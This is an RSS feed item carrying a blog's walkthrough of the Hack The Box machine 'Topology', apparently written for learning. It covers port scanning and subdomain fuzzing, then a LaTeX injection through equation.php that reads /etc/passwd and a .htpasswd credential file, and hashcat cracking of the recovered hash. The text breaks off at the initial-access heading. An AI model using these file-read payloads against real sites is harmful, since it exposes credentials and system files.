<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Hashcat on ybenel</title>
    <link>https://ybenel.cf/tags/hashcat/</link>
    <description>ybenel (Hashcat)</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 16 Jun 2023 00:00:00 +0000</lastBuildDate>
    
    <atom:link href="https://ybenel.cf/tags/hashcat/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>HTB - Topology</title>
      <link>https://ybenel.cf/post/htb_topology/</link>
      <pubDate>Fri, 16 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://ybenel.cf/post/htb_topology/</guid>
      <description>&lt;p&gt;Topology is an easy box that starts off by finding a local file discloser vulnerability,
In a LaTeX template, which allows us to get gain access by obtaining a password file with an encrypted password
that&amp;rsquo;s reused by a user on the box.
For ROOT there&amp;rsquo;s a setuid binary which we simply use to obtain root privileges.&lt;/p&gt;
&lt;h2 id=&#34;slim-to-none&#34; &gt;Slim To None
&lt;span&gt;
    &lt;a href=&#34;#slim-to-none&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;user-enumeration&#34; &gt;User Enumeration
&lt;span&gt;
    &lt;a href=&#34;#user-enumeration&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h4 id=&#34;open-ports&#34; &gt;Open Ports
&lt;span&gt;
    &lt;a href=&#34;#open-ports&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;As usual with most boxes only 2 ports open.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;80 HTTP (Apache)&lt;/li&gt;
&lt;li&gt;22 SSH (OpenSSH)&lt;/li&gt;
&lt;/ul&gt;
&lt;!--listend--&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;#Nmap 7.93 scan initiated Fri Jun 16 21:37:29 2023 as: nmap -p- --min-rate=10000 -sCV -oN scans/full-scan.nmap -vvv 10.10.11.217
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic&#34;&gt;&lt;/span&gt;Nmap scan report &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;10.10.11.217&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up, received syn-ack (&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;0.15&lt;/span&gt;s latency).
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Scanned at &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;2023&lt;/span&gt;-&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;06&lt;/span&gt;-&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;21&lt;/span&gt;:&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;37&lt;/span&gt;:&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;30&lt;/span&gt; UTC &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;87&lt;/span&gt;s
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;38893&lt;/span&gt; closed tcp ports (conn-refused), &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;26640&lt;/span&gt; filtered tcp ports (no-response)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE REASON  VERSION
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;22&lt;/span&gt;/tcp open  ssh     syn-ack OpenSSH &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;8.2&lt;/span&gt;p1 Ubuntu &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;4u&lt;/span&gt;buntu0&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;.7&lt;/span&gt; (Ubuntu Linux; protocol &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;2.0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssh-hostkey:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;3072&lt;/span&gt; dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+...[snip]...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;256&lt;/span&gt; d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdH..[snip].&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;.8&lt;/span&gt;R28Y4CDP7h0h9vnlLWo=
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;256&lt;/span&gt; &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;4&lt;/span&gt;ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaM68hPSVQXNWZbTV88LsN41odqyoxxgwKEb1SOPm5k
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;80&lt;/span&gt;/tcp open  http    syn-ack Apache httpd &lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;2.4.41&lt;/span&gt; ((Ubuntu))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| http-methods:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  Supported Methods: OPTIONS HEAD GET POST
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache/&lt;span style=&#34;color:#0086f7;font-weight:bold&#34;&gt;2.4.41&lt;/span&gt; (Ubuntu)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Miskatonic University | Topology Group
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;initial-enum&#34; &gt;Initial Enum
&lt;span&gt;
    &lt;a href=&#34;#initial-enum&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Checking the http site, we just get a static site with a bunch &lt;strong&gt;users&lt;/strong&gt; and an &lt;strong&gt;email&lt;/strong&gt; and a list of &lt;strong&gt;projects&lt;/strong&gt;.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_webpage.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Default Web Page&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Lilian Klein (lklein@topology.htb)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Vajramani Daisley
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Derek Abrahams
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The interesting one is the &lt;strong&gt;LaTeX Equation Generator&lt;/strong&gt; which is pointing to &lt;a href=&#34;http://latex.topology.htb&#34;&gt;http://latex.topology.htb&lt;/a&gt;.&lt;/p&gt;
&lt;!--list-separator--&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Vhost discovery.&lt;/p&gt;
&lt;p&gt;We also will look for any other subdomains that might be hidden. Like our other projects or something better.
For that we&amp;rsquo;ll use &lt;strong&gt;Ffuf&lt;/strong&gt;.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_vhost.png&#34;/&gt;&lt;figcaption&gt;
                &lt;h4&gt;FUZZ With FFUF&lt;/h4&gt;
            &lt;/figcaption&gt;
    &lt;/figure&gt;

&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;interesting-discoveries&#34; &gt;Interesting Discoveries
&lt;span&gt;
    &lt;a href=&#34;#interesting-discoveries&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;http://stats.topology.htb&#34;&gt;http://stats.topology.htb&lt;/a&gt; which is just a static webpage with jpg images.
&lt;a href=&#34;http://dev.topology.htb&#34;&gt;http://dev.topology.htb&lt;/a&gt; requires &lt;strong&gt;credentials&lt;/strong&gt; in order to access it.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_dev.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;(Dev Sub) Require AUTH&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;http://latex.topology.htb&#34;&gt;http://latex.topology.htb&lt;/a&gt; is an open directory listing which has couple files.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_latex_dir.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Listing Directory&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

The interesting one is &lt;code&gt;equation.php&lt;/code&gt; which allows us to run latex commands and it compiles it then convert it into a png.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_gen.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;TEX Input Prompt&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_gen_out.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Generated Image&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/p&gt;
&lt;h4 id=&#34;vulnerabilities-and-exploitation&#34; &gt;Vulnerabilities And Exploitation
&lt;span&gt;
    &lt;a href=&#34;#vulnerabilities-and-exploitation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Before we get into the file discloser vulnerability, let&amp;rsquo;s take a step further explaining what LaTeX is.
LaTeX is a typesetting system to create documents, meaning there&amp;rsquo;s not much we can do except for reading
local TeX files.
In LaTeX there&amp;rsquo;s quite few Engines like, LuaLaTex, pdflatex, XeTex, Tex, Latex, LaTeX2e..
there&amp;rsquo;s couple commands we can use to read a file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\input&lt;/span&gt;{}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\include&lt;/span&gt;{}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\includeonly&lt;/span&gt;{}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\usepackage&lt;/span&gt;{}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However if we tried any of these commands, we&amp;rsquo;ll instead get an illegal command output,
So we can verify there&amp;rsquo;s some sort of input validation checking, that will try to protect it.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_illegal.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Input Filtration&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Except&lt;/em&gt; in the directory listing we see couple TeX files presented, so there might be a package used that
has the ability to read files.
Check &lt;code&gt;header.tex&lt;/code&gt; we can see the following packages used.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_header.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Preamble Header&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

One that grabbed my attention was &lt;strong&gt;listings&lt;/strong&gt; which a package support typeset source code,
Mainly used for syntax highlighting, numbering and listings.
If you used LaTeX before and listings package you might be familiar with &lt;code class=&#34;code-inline language-latex&#34;&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\lsinputlisting&lt;/span&gt;&lt;/code&gt; which able to read a file.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\lsinputlisting&lt;/span&gt;&lt;span style=&#34;color:#ff0086;font-weight:bold&#34;&gt;[Language=Python]&lt;/span&gt;{myexample.py}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;%% OR Without the setting options.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#080;background-color:#0f140f;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\lsinputlisting&lt;/span&gt;{myexample.py}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So let&amp;rsquo;s try it.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_lsinput_error.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;LaTeX Errors&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

Hmm, it wasn&amp;rsquo;t able to successfully output an image.
My first thoughts is that something is wrong with
the back-end code that&amp;rsquo;s not handling LaTeX correctly like not escape backslash and its very
common, when you create a preamble in &lt;em&gt;elisp&lt;/em&gt; or in this case &lt;em&gt;php&lt;/em&gt;
So i&amp;rsquo;ve tried &lt;code class=&#34;code-inline language-latex&#34;&gt; &lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\\\lsinputlisting&lt;/span&gt;{/etc/passwd}&lt;/code&gt; and it still didn&amp;rsquo;t work.
Then i remembered that from the web page this note.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;LaTeX inline math mode syntax in the text field (only oneliners supported at the moment).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Of cource one-liners do use dollar signs that&amp;rsquo;s way it didn&amp;rsquo;t work correctly.
In the backend its something like this.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a&#34;&gt;$texfile&lt;/span&gt;=&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#34; &lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;document{article}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;usepackage{listings}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;usepacakge{amsmath}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;usepackage{charter}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;begin{document}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&amp;#39;$&amp;#39; . &lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;$textinput&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt; . &amp;#39;$&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#0086d2&#34;&gt;end{document} &amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;in everything between &lt;code&gt;$MATHHERE$&lt;/code&gt; is considered a math equation.
So let&amp;rsquo;s escape it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\frac&lt;/span&gt;{1}{n^2}&lt;span style=&#34;color:#0086d2&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#fb660a&#34;&gt;\lstinputlisting&lt;/span&gt;{/etc/passwd}&lt;span style=&#34;color:#0086d2&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\frac&lt;/span&gt;{1}{n*2}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and voila!
&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_filediscloser.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;!--list-separator--&gt;
&lt;h5 id=&#34;obtaining-access&#34; &gt;Obtaining Access.
&lt;span&gt;
    &lt;a href=&#34;#obtaining-access&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h5&gt;&lt;p&gt;I wasn&amp;rsquo;t able to read user&amp;rsquo;s ssh key, but since &lt;strong&gt;dev&lt;/strong&gt; subdomain is auth protected.
We can use our file discoloser vulnerability to obtain the password.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-latex&#34; data-lang=&#34;latex&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://latex.topology.htb/equation.php?eqn=&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\frac&lt;/span&gt;{1}{n^2}&lt;span style=&#34;color:#0086d2&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#fb660a&#34;&gt;\lstinputlisting&lt;/span&gt;{/var/www/dev/.htpasswd}&lt;span style=&#34;color:#0086d2&#34;&gt;$&lt;/span&gt;&lt;span style=&#34;color:#fb660a;font-weight:bold&#34;&gt;\frac&lt;/span&gt;{1}{n*2}&amp;amp;submit=
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now Let&amp;rsquo;s convert our image to text.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/toplogy_imageToText.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Converting Image To Text&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

And finally let&amp;rsquo;s crack it with hashcat.
&lt;figure&gt;&lt;img src=&#34;https://ybenel.cf/imgs/topology/topology_passwordcrack.png&#34;/&gt;&lt;figcaption&gt;
            &lt;h4&gt;Cracking With Hashcat&lt;/h4&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
&lt;/p&gt;
&lt;h4 id=&#34;initial-access-dot&#34; &gt;Initial Access.
&lt;span&gt;
    &lt;a href=&#34;#initial-access-dot&#34;&gt;
